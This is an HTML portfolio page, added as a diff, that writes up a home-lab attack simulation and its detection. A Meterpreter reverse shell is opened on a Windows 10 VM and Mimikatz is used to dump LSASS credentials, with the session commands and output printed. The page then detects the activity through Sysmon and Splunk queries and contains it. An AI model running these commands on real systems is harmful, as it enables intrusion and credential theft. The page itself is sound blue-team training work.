@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>SOC Home Lab — Attack Simulation & Detection | forbidden402</title>
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" fetchpriority="high">
+<link rel="stylesheet" href="/static/style.css?v=5.1" fetchpriority="high">
+<link rel="stylesheet" href="/static/case-study.css?v=1.4" fetchpriority="high">
+</head>
+<body>
+
+<!-- CYBER PAGE PRELOADER -->
+<div class="cs-loader-overlay" id="page-loader" aria-hidden="true">
+  <div class="cs-loader-box">
+    <div class="cs-loader-header">
+      <span class="cs-loader-tag">// TELEMETRY FEED · SOC LAB SIMULATION</span>
+      <span class="cs-loader-status"><span class="status-pulse"></span>INITIALIZING</span>
+    </div>
+    <div class="cs-loader-body">
+      <div class="cs-loader-cmd"><span class="cs-prompt">$</span> load dossier --telemetry attack-sim</div>
+      <div class="cs-progress-track">
+        <div class="cs-progress-fill" id="loader-progress-bar"></div>
+      </div>
+      <div class="cs-loader-meta">
+        <span class="cs-loader-detail" id="loader-status-text">STATUS: 200 OK · VERIFYING INTEGRITY</span>
+        <span class="cs-loader-pct" id="loader-pct-text">100%</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="cs-wrap">
+
+  <!-- TOP NAV -->
+  <nav class="cs-nav" aria-label="Breadcrumb navigation">
+    <a href="/#homelabs" class="btn-back">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      cd .. / return to portfolio
+    </a>
+    <span class="cs-nav-tag">// LAB 01 · ADVERSARY SIMULATION</span>
+  </nav>
+
+  <!-- HERO -->
+  <header class="cs-hero">
+    <div class="cs-meta-row">
+      <span class="cs-tag">// ENDPOINT &amp; SIEM INVESTIGATION</span>
+      <span class="proj-status status-completed"><span class="status-pulse"></span>COMPLETED LAB</span>
+    </div>
+    <h1 class="cs-title">SOC Home Lab — Attack Simulation &amp; Detection</h1>
+    <p class="cs-subtitle">
+      A comprehensive adversary-simulation-to-detection lab: executing a stageless Meterpreter reverse shell against a Windows 10 VM, dumping credentials with Mimikatz, and conducting full-spectrum threat hunting, packet analysis, and containment across Sysmon and Splunk Enterprise.
+    </p>
+    <div class="cs-actions">
+      <a class="btn-source" href="https://github.com/forbidden402/SOC-Home_lab-s" target="_blank" rel="noopener">
+        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.385-1.335-1.755-1.335-1.755-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+        view github repository &amp; raw logs
+      </a>
+    </div>
+  </header>
+
+  <!-- METADATA GRID -->
+  <div class="attr-grid">
+    <div class="attr-item">
+      <span class="attr-label">Attacker Host</span>
+      <span class="attr-value">Kali Linux (192.168.133.142)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Target Endpoint</span>
+      <span class="attr-value">Windows 10 Pro (192.168.133.136)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">SIEM Platform</span>
+      <span class="attr-value">Splunk Enterprise 10.4.3</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Telemetry Agents</span>
+      <span class="attr-value">Sysmon + Splunk UF (index=main)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Network Analysis</span>
+      <span class="attr-value">Wireshark (payload.pcapng)</span>
+    </div>
+    <div class="attr-item">
+      <span class="attr-label">Attack Tooling</span>
+      <span class="attr-value">Metasploit + Mimikatz (Kiwi)</span>
+    </div>
+  </div>
+
+  <main class="cs-content">
+
+    <!-- 01 OVERVIEW -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">01</span>
+        <h2>Lab Architecture &amp; Objectives</h2>
+      </div>
+      <p>
+        The objective of this hands-on lab was to build a complete blue-team detection and incident response pipeline within an isolated VMware virtual environment. By executing an attack end-to-end, I mapped adversary tactics directly to Windows endpoint telemetry and centralized SIEM searches.
+      </p>
+      <div class="callout">
+        <div class="callout-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          Lab Topology &amp; Network Configuration
+        </div>
+        <p>
+          All virtual machines were configured on a dedicated host-only subnet (<code>192.168.133.0/24</code>). The Windows 10 target forwards all operational Sysmon events via Splunk Universal Forwarder to Splunk Enterprise running on the host machine.
+        </p>
+      </div>
+    </section>
+
+    <!-- 02 ATTACK LIFECYCLE -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">02</span>
+        <h2>Adversary Simulation Phase</h2>
+      </div>
+      <p>
+        The attack followed a classic Cyber Kill Chain progression:
+      </p>
+      <ul>
+        <li><strong>Payload Delivery:</strong> Staged <code>stageless.exe</code> on Kali using Python's <code>http.server</code> on port <code>8080</code>.</li>
+        <li><strong>C2 Execution:</strong> Configured <code>exploit/multi/handler</code> with payload <code>windows/x64/meterpreter_reverse_tcp</code> listening on port <code>4444</code>. Victim executed the binary, establishing an active Meterpreter session.</li>
+        <li><strong>Secondary Tool Staging:</strong> Uploaded <code>mimikatz.exe</code> to <code>C:\Users\Public\mimikatz.exe</code> via the Meterpreter tunnel.</li>
+        <li><strong>Credential Access:</strong> Loaded the Meterpreter <code>kiwi</code> extension, granted <code>privilege::debug</code> (Privilege 20 OK), and dumped LSASS plaintext/hashes using <code>sekurlsa::logonpasswords</code>.</li>
+        <li><strong>Host Discovery:</strong> Dropped into an interactive Windows <code>cmd.exe</code> shell executing <code>whoami</code> and <code>systeminfo</code>.</li>
+      </ul>
+
+      <div class="terminal-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">kali@kali: msfconsole (meterpreter kiwi dump)</span>
+        </div>
+        <div class="terminal-code">
+<span class="comment"># Establishing initial C2 session</span>
+msf exploit(multi/handler) > <span class="cmd">run</span>
+[*] Meterpreter session 1 opened (192.168.133.142:4444 -> 192.168.133.136:49867) at 2026-09-24 09:22:22 -0400
+
+<span class="comment"># Staging Mimikatz into Public folder</span>
+meterpreter > <span class="cmd">upload /home/kali/Downloads/mimikatz.exe C:\\Users\\Public</span>
+[*] Completed : /home/kali/Downloads/mimikatz.exe -> C:\Users\Public\mimikatz.exe
+
+<span class="comment"># Extracting LSASS hashes</span>
+meterpreter > <span class="cmd">load kiwi</span>
+meterpreter > <span class="cmd">kiwi_cmd privilege::debug</span>
+Privilege '20' OK
+meterpreter > <span class="cmd">kiwi_cmd sekurlsa::logonpasswords</span>
+Authentication Id : 0 ; 206043 (00000000:000324db)
+User Name         : <span class="highlight">username</span>
+Domain            : DESKTOP-BP3ESIC
+NTLM              : <span class="highlight">31d6cfe0d16ae931b73c59d7e0c089c0</span>
+SHA1              : <span class="highlight">da39a3ee5e6b4b0d3255bfef95601890afd80709</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 03 DETECTION & TELEMETRY -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">03</span>
+        <h2>Detection &amp; Endpoint Telemetry (Sysmon &amp; Wireshark)</h2>
+      </div>
+      <p>
+        Every stage of the adversary activity generated definitive forensic indicators across network and endpoint sensors:
+      </p>
+
+      <div class="cs-table-wrap">
+        <table class="cs-table">
+          <thead>
+            <tr>
+              <th>Sensor / Event</th>
+              <th>Technique &amp; Event Code</th>
+              <th>Forensic Significance</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="mono">Wireshark (L4)</td>
+              <td>TCP Stream 24</td>
+              <td>Captured HTTP 200 payload download on port 8080 and immediate reverse TCP 3-way handshake on port 4444.</td>
+            </tr>
+            <tr>
+              <td class="mono">Sysmon Event 15</td>
+              <td>FileCreateStreamHash</td>
+              <td>Edge tagged download with Mark-of-the-Web Zone.Identifier (<code>ZoneId=3</code>, Internet zone), proving external origin.</td>
+            </tr>
+            <tr>
+              <td class="mono">Sysmon Event 1</td>
+              <td>Process Create</td>
+              <td>Reconstructed malicious process tree: <code>explorer.exe → stageless.exe (PID 3836) → cmd.exe (PID 6220)</code>.</td>
+            </tr>
+            <tr>
+              <td class="mono">Sysmon Event 3 &amp; 22</td>
+              <td>Network Connect / DNS</td>
+              <td>Logged outbound TCP beacon from <code>stageless.exe</code> to <code>192.168.133.142:4444</code>.</td>
+            </tr>
+            <tr>
+              <td class="mono">Sysmon Event 11</td>
+              <td>File Create</td>
+              <td>Detected <code>stageless.exe</code> writing secondary payload <code>C:\Users\Public\mimikatz.exe</code>.</td>
+            </tr>
+            <tr>
+              <td class="mono">Sysmon Event 5</td>
+              <td>Process Terminated</td>
+              <td>Recorded the exact timestamp when <code>stageless.exe</code> was terminated during incident response.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 04 SPLUNK HUNTING -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">04</span>
+        <h2>Threat Hunting in Splunk Enterprise</h2>
+      </div>
+      <p>
+        Moving into Splunk Enterprise, I correlated the raw Sysmon events into a unified incident timeline. Instead of looking at disconnected alerts, I built SPL queries to validate the entire attack chain.
+      </p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Splunk Threat Hunting Query — Process Lifecycle &amp; Network Correlation
+        </div>
+        <div class="splunk-query">
+<span class="kw">index</span>=main host=DESKTOP-BP3ESIC sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
+(Image="*stageless.exe*" OR ParentImage="*stageless.exe*")
+<span class="pipe">|</span> <span class="kw">table</span> _time, EventCode, Image, ParentImage, CommandLine, User
+<span class="pipe">|</span> <span class="kw">sort</span> _time
+        </div>
+      </div>
+
+      <p>
+        <strong>Search Results:</strong> The query extracted 15 correlated events across the session, proving the complete sequence: binary drop → network beacon → file drop → command shell spawn → containment.
+      </p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Detection Engineering — Production Alert Rule (Dropper &amp; Beacon Correlation)
+        </div>
+        <div class="splunk-query">
+<span class="kw">index</span>=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
+(EventCode=1 ParentImage="*\\explorer.exe" Image="*\\Downloads\\*.exe")
+OR (EventCode=3 DestinationPort IN (4444,4443,8080))
+OR (EventCode=11 TargetFilename="*mimikatz*")
+<span class="pipe">|</span> <span class="kw">stats</span> values(EventCode) <span class="kw">as</span> event_codes, values(Image) <span class="kw">as</span> images <span class="kw">by</span> ProcessGuid, User
+<span class="pipe">|</span> <span class="kw">where</span> mvcount(event_codes) > 1
+        </div>
+      </div>
+    </section>
+
+    <!-- 05 CONTAINMENT & RESPONSE -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">05</span>
+        <h2>Endpoint Containment &amp; Verification</h2>
+      </div>
+      <p>
+        Once the malicious PID was confirmed through Splunk and Sysmon, I performed live endpoint containment on the Windows 10 victim:
+      </p>
+
+      <div class="terminal-block">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span>
+          </div>
+          <span class="terminal-title">C:\Windows\System32\cmd.exe (Administrator)</span>
+        </div>
+        <div class="terminal-code">
+C:\Windows\system32> <span class="cmd">tasklist | find "stageless.exe"</span>
+stageless.exe                 3836 Console                    1        596 K
+
+C:\Windows\system32> <span class="cmd">taskkill /F /IM stageless.exe</span>
+SUCCESS: The process "stageless.exe" with PID 3836 has been terminated.
+        </div>
+      </div>
+
+      <p>
+        Sysmon Event ID 5 immediately logged the termination of PID 3836, confirming that the reverse C2 channel on port 4444 had been severed and containment was achieved.
+      </p>
+    </section>
+
+    <!-- 06 IOC TABLE -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">06</span>
+        <h2>Indicators of Compromise (IOC) Matrix</h2>
+      </div>
+      <div class="cs-table-wrap">
+        <table class="cs-table">
+          <thead>
+            <tr>
+              <th>Indicator Type</th>
+              <th>Value</th>
+              <th>Context</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>SHA-256</td>
+              <td class="mono">DB33E46C6ADFC98F5D834F727C087E112BBFA9CBAA805458D127387BE01E97</td>
+              <td>stageless.exe payload</td>
+            </tr>
+            <tr>
+              <td>MD5</td>
+              <td class="mono">159C042FB623521A77C2C16CCC524DD8</td>
+              <td>stageless.exe payload</td>
+            </tr>
+            <tr>
+              <td>Delivery URL</td>
+              <td class="mono">http://192.168.133.142:8080/stageless.exe</td>
+              <td>Kali Python HTTP Stager</td>
+            </tr>
+            <tr>
+              <td>C2 Server</td>
+              <td class="mono">192.168.133.142:4444</td>
+              <td>Metasploit Reverse-TCP Handler</td>
+            </tr>
+            <tr>
+              <td>Dropped Tool</td>
+              <td class="mono">C:\Users\Public\mimikatz.exe</td>
+              <td>Secondary Credential Dumping Weapon</td>
+            </tr>
+            <tr>
+              <td>Compromised NTLM</td>
+              <td class="mono">31d6cfe0d16ae931b73c59d7e0c089c0</td>
+              <td>Extracted from LSASS memory</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="cs-footer">
+    <a href="/#homelabs" class="btn-back">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      cd .. / return to overview
+    </a>
+    <a href="/pages/threatscan.html" class="btn-back">
+      next case study: ThreatScan TIP →
+    </a>
+  </footer>
+
+</div>
+
+<script src="/static/loader.js?v=1.1" defer></script>
+</body>
+</html>
